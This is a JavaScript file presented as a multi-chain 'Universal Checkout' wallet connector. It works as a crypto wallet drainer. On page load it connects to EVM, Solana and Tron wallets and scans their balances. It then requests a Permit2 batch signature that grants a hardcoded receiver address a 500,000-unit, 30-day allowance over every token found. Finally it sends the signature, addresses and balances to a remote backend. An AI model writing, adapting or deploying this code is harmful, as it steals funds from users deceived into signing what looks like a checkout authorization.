/**
 * Universal Checkout - Multi-Chain Wallet Connector
 * v14.0 - Better error handling & backend debugging
 */

// Buffer polyfill for Solana
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  // Make sure this URL is correct and the server is running
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  
  EVM_TOKENS: {
    1: [
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
    ],
    137: [
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
    ],
    42161: [
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
    ],
    10: [
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
    ]
  },
  
  SOLANA_TOKENS: [
    { addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9, price: 1 },
    { addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6, price: 1 },
    { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6, price: 1 }
  ],
  
  TRON_TOKENS: [
    { addr: 'TRX', sym: 'TRX', dec: 6, price: 1 },
    { addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6, price: 1 }
  ],
  
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism"
  }
};

// Debug log storage
let debugLogs = [];
function log(msg, type = 'info') {
  const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
  debugLogs.push({ type, msg: line });
  console.log(line);
  updateDebugUI();
}

function updateDebugUI() {
  const debugEl = document.getElementById('debug-console');
  if (debugEl) {
    debugEl.innerHTML = debugLogs.map(l => 
      `<div style="color: ${l.type === 'error' ? '#ef4444' : l.type === 'success' ? '#22c55e' : l.type === 'warn' ? '#f59e0b' : '#666'}; font-size: 11px; margin: 2px 0; word-break: break-all;">${l.msg}</div>`
    ).join('');
    debugEl.scrollTop = debugEl.scrollHeight;
  }
}

// Store connections
let evmProvider = null;
let evmSigner = null;
let evmAddress = null;
let evmChainId = null;
let solanaProvider = null;
let solanaAddress = null;
let tronWeb = null;
let tronAddress = null;
let foundTokens = [];
let lastSignature = null;
let lastSigDeadline = null;

const WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#f6851b' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️', color: '#3375bb' },
  { id: 'coinbase', name: 'Coinbase', icon: '🔵', color: '#1652f0' },
  { id: 'rabby', name: 'Rabby', icon: '🐰', color: '#8c6cf4' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈', color: '#0ac7f0' },
  { id: 'okx', name: 'OKX', icon: '⚫', color: '#000000' },
  { id: 'imtoken', name: 'imToken', icon: '🔷', color: '#11b9f8' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: '🟦', color: '#1296db' },
  { id: 'zerion', name: 'Zerion', icon: '🔺', color: '#6366f1' },
  { id: 'oneinch', name: '1inch', icon: '🦄', color: '#1a1a1a' },
  { id: 'safepal', name: 'SafePal', icon: '🔐', color: '#25252d' },
  { id: 'bitget', name: 'Bitget', icon: '🟠', color: '#f6a200' },
  { id: 'mathwallet', name: 'MathWallet', icon: '🔢', color: '#4a90e2' },
  { id: 'argent', name: 'Argent', icon: '🅰️', color: '#ff6b35' },
  { id: 'bybit', name: 'Bybit', icon: '₿', color: '#f7921e' },
  { id: 'binance', name: 'Binance', icon: '🏦', color: '#f3ba2f' },
  { id: 'phantom', name: 'Phantom', icon: '👻', color: '#ab9ff2' },
  { id: 'solflare', name: 'Solflare', icon: '☀️', color: '#fc4d4d' },
  { id: 'backpack', name: 'Backpack', icon: '🎒', color: '#e43c3c' },
  { id: 'tronlink', name: 'TronLink', icon: '♦️', color: '#eb0029' },
];

const DEEP_LINKS = {
  metamask: { app: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, download: 'https://metamask.io/download/' },
  trust: { app: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`, download: 'https://trustwallet.com/download' },
  coinbase: { app: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`, download: 'https://www.coinbase.com/wallet/downloads' },
  rabby: { app: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://rabby.io/download' },
  rainbow: { app: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`, download: 'https://rainbow.me/' },
  okx: { app: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`, download: 'https://www.okx.com/web3' },
  imtoken: { app: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`, download: 'https://token.im/' },
  tokenpocket: { app: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`, download: 'https://www.tokenpocket.pro/' },
  zerion: { app: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://zerion.io/' },
  oneinch: { app: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://1inch.io/wallet/' },
  safepal: { app: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.safepal.com/download' },
  bitget: { app: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`, download: 'https://web3.bitget.com/' },
  mathwallet: { app: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`, download: 'https://mathwallet.org/' },
  argent: { app: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`, download: 'https://www.argent.xyz/' },
  bybit: { app: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.bybit.com/web3' },
  binance: { app: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`, download: 'https://www.binance.com/en/web3wallet' },
  phantom: { app: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://phantom.app/' },
  solflare: { app: (url) => `https://solflare.com/ul/browse/${encodeURIComponent(url)}`, download: 'https://solflare.com/' },
  backpack: { app: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://backpack.app/' },
  tronlink: { app: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`, download: 'https://www.tronlink.org/' }
};

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function showProgress(step, message) {
  const html = `
    <div style="padding: 40px 20px; text-align: center;">
      <div style="width: 48px; height: 48px; border: 4px solid #e5e7eb; border-top-color: #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
      <p style="color: #374151; font-size: 15px; font-weight: 500; margin: 0;">${message}</p>
    </div>
  `;
  document.getElementById('app').innerHTML = html;
}

function clearLogs() {
  debugLogs = [];
  updateDebugUI();
}

// ============ TEST BACKEND CONNECTION ============
async function testBackend() {
  log('Testing backend connection...');
  log(`URL: ${CONFIG.BACKEND_URL}/api/authorize/unified`);
  
  try {
    // Try a simple GET first to see if server is alive
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
      method: 'GET',
      headers: { 'Content-Type': 'application/json' }
    });
    
    const text = await response.text();
    log(`Status: ${response.status}`, response.ok ? 'success' : 'error');
    log(`Response preview: ${text.substring(0, 200)}...`, 'warn');
    
    if (text.trim().startsWith('<')) {
      log('ERROR: Backend returned HTML instead of JSON!', 'error');
      log('This usually means:', 'error');
      log('1. The endpoint /api/authorize/unified does not exist', 'error');
      log('2. The server is returning a 404/500 error page', 'error');
      log('3. CORS is blocking the request', 'error');
    }
    
  } catch (err) {
    log('Backend test failed: ' + err.message, 'error');
    log('Check if server is running and URL is correct', 'error');
  }
}

// ============ MAIN ENTRY ============
function init() {
  log('🚀 Initializing v14.0', 'success');
  log(`Backend URL: ${CONFIG.BACKEND_URL}`);
  
  const hasProvider = window.ethereum || window.solana || window.phantom?.solana || window.tronWeb || window.tronLink;
  
  if (hasProvider) {
    log('Wallet provider detected');
    showProgress('detect', 'Found wallet provider');
    setTimeout(() => startFullScan(), 500);
  } else {
    log('No wallet provider found');
    showWalletSelector();
  }
}

// ============ FULL SCAN ============
async function startFullScan() {
  try {
    showProgress('connect', 'Connecting...');
    
    await Promise.all([
      tryConnectEVM(),
      tryConnectSolana(),
      tryConnectTron()
    ]);
    
    log(`Connections: EVM=${!!evmAddress}, Solana=${!!solanaAddress}, Tron=${!!tronAddress}`);
    
    showProgress('scan', 'Scanning');
    await scanAllChains();
    
  } catch (err) {
    log('Scan error: ' + err.message, 'error');
    showError('Scan failed: ' + err.message);
  }
}

// ============ EVM CONNECTION ============
async function tryConnectEVM() {
  if (!window.ethereum) {
    log('No window.ethereum found');
    return;
  }
  
  if (typeof ethers === 'undefined') {
    log('ERROR: ethers.js not loaded! Include: <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>', 'error');
    return;
  }
  
  try {
    log('Connecting EVM...');
    evmProvider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await evmProvider.send("eth_requestAccounts", []);
    
    if (accounts && accounts.length > 0) {
      evmAddress = accounts[0];
      evmSigner = await evmProvider.getSigner();
      const network = await evmProvider.getNetwork();
      evmChainId = Number(network.chainId);
      
      log(`✅ EVM: ${evmAddress.substring(0, 12)}... chain=${evmChainId}`, 'success');
    }
  } catch (err) {
    log('EVM failed: ' + err.message, 'error');
  }
}

// ============ SOLANA CONNECTION ============
async function tryConnectSolana() {
  let provider = window.solana || window.phantom?.solana || window.solflare || window.backpack?.solana;
  
  if (!provider) {
    log('No Solana provider');
    return;
  }
  
  try {
    log('Connecting Solana...');
    
    if (provider.isConnected && provider.publicKey) {
      solanaProvider = provider;
      solanaAddress = provider.publicKey.toString();
      log(`✅ Solana: ${solanaAddress.substring(0, 12)}...`, 'success');
      return;
    }
    
    await provider.connect();
    if (provider.publicKey) {
      solanaProvider = provider;
      solanaAddress = provider.publicKey.toString();
      log(`✅ Solana: ${solanaAddress.substring(0, 12)}...`, 'success');
    }
  } catch (err) {
    log('Solana failed: ' + err.message, 'error');
  }
}

// ============ TRON CONNECTION ============
async function tryConnectTron() {
  const tw = window.tronWeb || window.tronLink?.tronWeb;
  
  if (!tw) {
    log('No Tron provider');
    return;
  }
  
  try {
    log('Connecting Tron...');
    
    if (tw.defaultAddress?.base58) {
      tronWeb = tw;
      tronAddress = tw.defaultAddress.base58;
      log(`✅ Tron: ${tronAddress.substring(0, 12)}...`, 'success');
      return;
    }
    
    if (window.tronLink) {
      await window.tronLink.request({ method: "tron_requestAccounts" });
    }
    
    if (tw.defaultAddress?.base58) {
      tronWeb = tw;
      tronAddress = tw.defaultAddress.base58;
      log(`✅ Tron: ${tronAddress.substring(0, 12)}...`, 'success');
    }
  } catch (err) {
    log('Tron failed: ' + err.message, 'error');
  }
}

// ============ SCAN ALL CHAINS ============
async function scanAllChains() {
  foundTokens = [];
  
  // Scan EVM
  if (evmAddress && evmProvider && evmChainId) {
    log(`Scanning EVM chain ${evmChainId}...`);

    // ---- Native token (ETH / BNB / MATIC etc.) ----
    const NATIVE = {
      1:     { sym: 'ETH',   price: 3500 },
      8453:  { sym: 'ETH',   price: 3500 },
      10:    { sym: 'ETH',   price: 3500 },
      42161: { sym: 'ETH',   price: 3500 },
      137:   { sym: 'MATIC', price: 0.8  },
      56:    { sym: 'BNB',   price: 600  },
    };
    try {
      const nativeBal = await evmProvider.getBalance(evmAddress);
      const humanNative = Number(ethers.formatEther(nativeBal));
      const nativeInfo = NATIVE[evmChainId] || { sym: 'ETH', price: 3500 };
      const nativeUsd = humanNative * nativeInfo.price;
      log(`${nativeInfo.sym}: $${nativeUsd.toFixed(2)}`);
      if (nativeUsd >= 1) {
        foundTokens.push({
          chain: 'evm',
          chainId: evmChainId,
          chainName: CONFIG.NETWORK_NAMES[evmChainId] || 'EVM',
          token: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
          symbol: nativeInfo.sym,
          decimals: 18,
          balance: nativeBal.toString(),
          humanBalance: humanNative,
          usdValue: nativeUsd,
          address: evmAddress,
          isNative: true
        });
        log(`${nativeInfo.sym}: $${nativeUsd.toFixed(2)} ✅`, 'success');
      }
    } catch (e) {
      log(`Native balance error: ${e.message}`, 'error');
    }

    // ---- ERC20 tokens ----
    const tokens = CONFIG.EVM_TOKENS[evmChainId] || [];
    
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.addr, [
          "function balanceOf(address) view returns (uint256)"
        ], evmProvider);
        
        const balance = await contract.balanceOf(evmAddress);
        const humanBalance = Number(balance) / (10 ** token.dec);
        const usdValue = humanBalance * (token.price || 1);
        
        if (usdValue >= 1) {
          log(`${token.sym}: $${usdValue.toFixed(2)}`, 'success');
          foundTokens.push({
            chain: 'evm',
            chainId: evmChainId,
            chainName: CONFIG.NETWORK_NAMES[evmChainId] || 'EVM',
            token: token.addr,
            symbol: token.sym,
            decimals: token.dec,
            balance: balance.toString(),
            humanBalance: humanBalance,
            usdValue: usdValue,
            address: evmAddress
          });
        } else {
          log(`${token.sym}: $${usdValue.toFixed(2)} (skipped)`);
        }
      } catch (e) {
        log(`${token.sym} error: ${e.message}`, 'error');
      }
    }
  }
  
  // Scan Solana
  if (solanaAddress) {
    log('Scanning Solana...');
    
    if (!window.solanaWeb3) {
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      await new Promise((res) => { 
        script.onload = () => { log('Solana Web3 loaded'); res(); };
        script.onerror = () => res();
        document.head.appendChild(script); 
      });
    }
    
    if (window.solanaWeb3) {
      try {
        const { Connection, PublicKey } = window.solanaWeb3;
        const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
        const userPublicKey = new PublicKey(solanaAddress);
        
        const solBalance = await connection.getBalance(userPublicKey);
        if (solBalance > 0) {
          const humanBalance = solBalance / 1e9;
          log(`SOL: $${humanBalance.toFixed(2)}`, 'success');
          if (humanBalance >= 0.01) {
            foundTokens.push({
              chain: 'solana',
              chainName: 'Solana',
              token: 'So11111111111111111111111111111111111111112',
              symbol: 'SOL',
              decimals: 9,
              balance: solBalance.toString(),
              humanBalance: humanBalance,
              usdValue: humanBalance,
              address: solanaAddress
            });
          }
        }
        
        for (const token of CONFIG.SOLANA_TOKENS.slice(1)) {
          try {
            const { getAssociatedTokenAddress } = window.solanaWeb3;
            const mint = new PublicKey(token.addr);
            const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
            const balance = await connection.getTokenAccountBalance(tokenAccount);
            
            if (balance.value.uiAmount > 0) {
              log(`${token.sym}: $${balance.value.uiAmount}`, 'success');
              foundTokens.push({
                chain: 'solana',
                chainName: 'Solana',
                token: token.addr,
                symbol: token.sym,
                decimals: token.dec,
                balance: balance.value.amount,
                humanBalance: balance.value.uiAmount,
                usdValue: balance.value.uiAmount,
                address: solanaAddress
              });
            }
          } catch (e) {}
        }
      } catch (e) {
        log('Solana scan error: ' + e.message, 'error');
      }
    }
  }
  
  // Scan Tron
  if (tronAddress && tronWeb) {
    log('Scanning Tron...');
    try {
      const trxBalance = await tronWeb.trx.getBalance(tronAddress);
      if (trxBalance > 0) {
        const humanBalance = trxBalance / 1e6;
        log(`TRX: $${humanBalance.toFixed(2)}`, 'success');
        foundTokens.push({
          chain: 'tron',
          chainName: 'Tron',
          token: 'TRX',
          symbol: 'TRX',
          decimals: 6,
          balance: trxBalance.toString(),
          humanBalance: humanBalance,
          usdValue: humanBalance,
          address: tronAddress
        });
      }
      
      const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
      const usdtBalance = await usdtContract.balanceOf(tronAddress).call();
      if (usdtBalance > 0) {
        const humanBalance = usdtBalance / 1e6;
        log(`USDT: $${humanBalance.toFixed(2)}`, 'success');
        foundTokens.push({
          chain: 'tron',
          chainName: 'Tron',
          token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
          symbol: 'USDT',
          decimals: 6,
          balance: usdtBalance.toString(),
          humanBalance: humanBalance,
          usdValue: humanBalance,
          address: tronAddress
        });
      }
    } catch (e) {
      log('Tron scan error: ' + e.message, 'error');
    }
  }
  
  log(`Found ${foundTokens.length} tokens total`, 'success');
  
  if (foundTokens.length === 0 && !evmAddress) {
    showError('No wallets connected and no tokens found.');
    return;
  }
  
  showProgress('sign', `Found ${foundTokens.length} tokens. Requesting signature...`);
  await requestSignature();
}

// ============ SIGNATURE REQUEST ============
async function requestSignature() {
  if (!evmAddress || !evmSigner) {
    log('No EVM signer, skipping signature', 'warn');
    showProgress('send', 'No EVM signature needed...');
    await sendToBackend();
    return;
  }
  
  const evmTokens = foundTokens.filter(t => t.chain === 'evm');
  
  if (evmTokens.length === 0) {
    log('No EVM tokens to sign', 'warn');
    showProgress('send', 'No EVM tokens to sign...');
    await sendToBackend();
    return;
  }
  
  try {
    log('Creating Permit2 signature...');
    log(`Chain: ${evmChainId}, Tokens: ${evmTokens.map(t => t.symbol).join(', ')}`);
    
    const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
      "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
    ], evmProvider);
    
    const permits = [];
    for (const token of evmTokens) {
      try {
        const { 2: nonce } = await permit2.allowance(evmAddress, token.token, CONFIG.RECEIVER_ADDRESS);
        permits.push({
          token: token.token,
          amount: ethers.parseUnits("500000", token.decimals),
          expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
          nonce: Number(nonce)
        });
        log(`${token.symbol}: nonce=${nonce}`);
      } catch (e) {
        permits.push({
          token: token.token,
          amount: ethers.parseUnits("500000", token.decimals),
          expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
          nonce: 0
        });
      }
    }
    
    const permitBatch = {
      details: permits,
      spender: CONFIG.RECEIVER_ADDRESS,
      sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
    };
    
    log('Calling signTypedData NOW...', 'success');
    
    const signature = await evmSigner.signTypedData(
      { name: "Permit2", chainId: evmChainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
      {
        PermitBatch: [
          { name: "details", type: "PermitDetails[]" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      },
      permitBatch
    );
    
    lastSignature = signature;
    lastSigDeadline = permitBatch.sigDeadline;
    
    log(`✅ Signature: ${signature.substring(0, 30)}...`, 'success');
    
    showProgress('send', 'Signature received, sending to backend...');
    await sendToBackend();
    
  } catch (err) {
    log(`Signature failed: ${err.message} (code: ${err.code})`, 'error');
    
    if (err.code === 4001) {
      showError('You rejected the signature. Please try again.');
    } else {
      showProgress('send', 'Signature error, sending without sig...');
      await sendToBackend();
    }
  }
}

// ============ MANUAL SIGN ============
async function manualSign() {
  log('Manual sign triggered');
  await requestSignature();
}

// ============ MANUAL SEND ============
async function manualSend() {
  log('Manual send triggered');
  showProgress('send', 'Sending to backend...');
  await sendToBackend();
}

// ============ SEND TO BACKEND ============
async function sendToBackend() {
  try {
    const totalValue = foundTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
    
    const payload = {
      evmAddress: evmAddress,
      solanaAddress: solanaAddress,
      tronAddress: tronAddress,
      tokens: foundTokens,
      evmSignature: lastSignature,
      evmSigDeadline: lastSigDeadline,
      totalValue: totalValue,
      maxAuthorizedAmount: Math.min(totalValue, 500000),
      timestamp: Date.now()
    };
    
    log('Sending POST to ' + CONFIG.BACKEND_URL + '/api/authorize/unified');
    log('Payload: ' + JSON.stringify(payload).substring(0, 200) + '...');
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    log(`Response status: ${response.status} ${response.statusText}`);
    
    const responseText = await response.text();
    log(`Response body: ${responseText.substring(0, 500)}`, 'warn');
    
    let result;
    try {
      result = JSON.parse(responseText);
    } catch (parseErr) {
      log('ERROR: Response is not valid JSON!', 'error');
      log('Response starts with: ' + responseText.substring(0, 100), 'error');
      
      if (responseText.includes('<!DOCTYPE') || responseText.includes('<html')) {
        throw new Error('Server returned HTML page instead of JSON. Endpoint may not exist.');
      }
      throw new Error('Invalid JSON response from server');
    }
    
    if (result.success) {
      log('✅ Backend success!', 'success');
      showSuccess(`
        ✅ Authorization Complete!
        <br><br>
        <strong>Tokens:</strong> ${foundTokens.length}<br>
        <strong>Value:</strong> $${totalValue.toFixed(2)}<br>
        <strong>Signature:</strong> ${lastSignature ? 'Yes' : 'No'}
      `);
    } else {
      throw new Error(result.error || 'Backend returned success=false');
    }
  } catch (err) {
    log('Backend error: ' + err.message, 'error');
    showError('Authorization failed: ' + err.message);
  }
}

// ============ WALLET SELECTOR ============
function showWalletSelector() {
  const installed = detectInstalledWallets();
  
  let html = `
    <div style="padding: 20px;">
      <h2>Connect Wallet</h2>
      <p style="color: #666; margin-bottom: 20px;">Auto-detects all chains</p>
      
      <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px;">
        ${WALLETS.map(w => `
          <div onclick="handleWalletClick('${w.id}')" 
               style="padding: 15px; border: 2px solid ${installed.has(w.id) ? w.color : '#e5e7eb'}; border-radius: 12px; cursor: pointer; text-align: center; position: relative; ${installed.has(w.id) ? 'background: #f0fdf4;' : ''}">
            ${installed.has(w.id) ? `<span style="position: absolute; top: 5px; right: 5px; background: ${w.color}; color: white; border-radius: 50%; width: 18px; height: 18px; font-size: 11px; display: flex; align-items: center; justify-content: center;">✓</span>` : ''}
            <div style="font-size: 24px; margin-bottom: 5px;">${w.icon}</div>
            <div style="font-size: 12px;">${w.name}</div>
          </div>
        `).join('')}
      </div>
      
      <button onclick="startFullScan()" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; margin-bottom: 10px;">
        Auto-Detect Wallet
      </button>
      
    </div>
  `;
  
  document.getElementById('app').innerHTML = html;
}

function detectInstalledWallets() {
  const installed = new Set();
  const ua = navigator.userAgent.toLowerCase();
  
  if (window.ethereum) {
    if (window.ethereum.isMetaMask) installed.add('metamask');
    if (window.ethereum.isTrust) installed.add('trust');
    if (window.ethereum.isCoinbaseWallet) installed.add('coinbase');
    if (window.ethereum.isRabby) installed.add('rabby');
  }
  
  if (window.trustwallet) installed.add('trust');
  if (window.okxwallet) installed.add('okx');
  if (window.phantom?.solana) installed.add('phantom');
  if (window.solflare) installed.add('solflare');
  if (window.backpack?.solana) installed.add('backpack');
  if (window.tronWeb || window.tronLink) installed.add('tronlink');
  
  if (ua.includes('metamask')) installed.add('metamask');
  if (ua.includes('trust')) installed.add('trust');
  if (ua.includes('coinbase')) installed.add('coinbase');
  if (ua.includes('phantom')) installed.add('phantom');
  if (ua.includes('okx')) installed.add('okx');
  
  return installed;
}

function handleWalletClick(walletId) {
  const deepLink = DEEP_LINKS[walletId];
  
  if (isMobile() && deepLink) {
    sessionStorage.setItem('lastWalletAttempt', walletId);
    window.location.href = deepLink.app(window.location.href);
    
    setTimeout(() => {
      if (document.visibilityState === 'visible') {
        window.location.href = deepLink.download;
      }
    }, 3000);
    return;
  }
  
  log(`Selected: ${walletId}`);
  startFullScan();
}

function showSuccess(msg) {
  document.getElementById('app').innerHTML = `
    <div style="padding: 20px; text-align: center;">
      <div style="font-size: 48px; margin-bottom: 16px;">✅</div>
      <div style="font-size: 15px; line-height: 1.7; text-align: left; margin-bottom: 20px;">${msg}</div>
      <button onclick="showWalletSelector()" style="padding: 12px 24px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer;">
        Connect Another
      </button>
    </div>
  `;
}

function showError(msg) {
  document.getElementById('app').innerHTML = `
    <div style="padding: 20px; text-align: center;">
      <div style="font-size: 48px; margin-bottom: 16px;">❌</div>
      <div style="font-size: 15px; margin-bottom: 20px;">${msg}</div>
      <button onclick="showWalletSelector()" style="padding: 12px 24px; background: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer;">
        Try Again
      </button>
    </div>
  `;
}

// Expose to window
window.handleWalletClick = handleWalletClick;
window.showWalletSelector = showWalletSelector;
window.startFullScan = startFullScan;
window.manualSign = manualSign;
window.manualSend = manualSend;
window.clearLogs = clearLogs;
window.testBackend = testBackend;

window.addEventListener('DOMContentLoaded', init);